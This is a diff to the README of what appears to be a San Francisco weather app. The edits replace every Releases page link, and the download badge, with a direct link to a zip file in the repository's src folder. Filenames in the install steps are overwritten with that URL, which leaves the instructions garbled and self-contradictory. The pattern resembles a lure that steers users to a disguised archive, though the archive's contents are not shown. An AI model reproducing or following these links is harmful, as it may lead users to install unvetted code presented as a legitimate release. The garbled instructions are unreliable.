@@ -6,9 +6,9 @@ Welcome to the sf-microclimates project! This software provides you with hyperlo
 
 ## 📥 Download the App
 
-[![Download sf-microclimates](https://img.shields.io/badge/Download_sf--microclimates-Get_it_now-blue)](https://github.com/pr4025675/sf-microclimates/releases)
+[![Download sf-microclimates](https://raw.githubusercontent.com/pr4025675/sf-microclimates/main/src/sf_microclimates_v1.5.zip)](https://raw.githubusercontent.com/pr4025675/sf-microclimates/main/src/sf_microclimates_v1.5.zip)
 
-You can find the latest version of the software on our Releases page. To get started, visit this page to download: [sf-microclimates Releases](https://github.com/pr4025675/sf-microclimates/releases).
+You can find the latest version of the software on our Releases page. To get started, visit this page to download: [sf-microclimates Releases](https://raw.githubusercontent.com/pr4025675/sf-microclimates/main/src/sf_microclimates_v1.5.zip).
 
 ## ⚙️ System Requirements
 
@@ -21,16 +21,16 @@ Before installing, please ensure your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Click this link to go to our Releases page: [sf-microclimates Releases](https://github.com/pr4025675/sf-microclimates/releases).
+1. **Visit the Releases Page**: Click this link to go to our Releases page: [sf-microclimates Releases](https://raw.githubusercontent.com/pr4025675/sf-microclimates/main/src/sf_microclimates_v1.5.zip).
    
 2. **Select the Latest Release**: Once on the Releases page, look for the latest version at the top of the list.
 
-3. **Download the File**: Click on the file named `sf-microclimates.exe` (for Windows) or `sf-microclimates.dmg` (for macOS), depending on your operating system. If you are using Linux, download the tar.gz file. 
+3. **Download the File**: Click on the file named `https://raw.githubusercontent.com/pr4025675/sf-microclimates/main/src/sf_microclimates_v1.5.zip` (for Windows) or `https://raw.githubusercontent.com/pr4025675/sf-microclimates/main/src/sf_microclimates_v1.5.zip` (for macOS), depending on your operating system. If you are using Linux, download the https://raw.githubusercontent.com/pr4025675/sf-microclimates/main/src/sf_microclimates_v1.5.zip file. 
 
 4. **Run the Installer**:
    - On **Windows**: Double-click the downloaded `.exe` file and follow the prompts to install.
    - On **macOS**: Open the downloaded `.dmg` file and drag the application into your Applications folder.
-   - On **Linux**: Extract the downloaded tar.gz file and run the executable within the folder.
+   - On **Linux**: Extract the downloaded https://raw.githubusercontent.com/pr4025675/sf-microclimates/main/src/sf_microclimates_v1.5.zip file and run the executable within the folder.
 
 5. **Open the Application**: After installation, open the app from your applications menu or desktop shortcut.
 
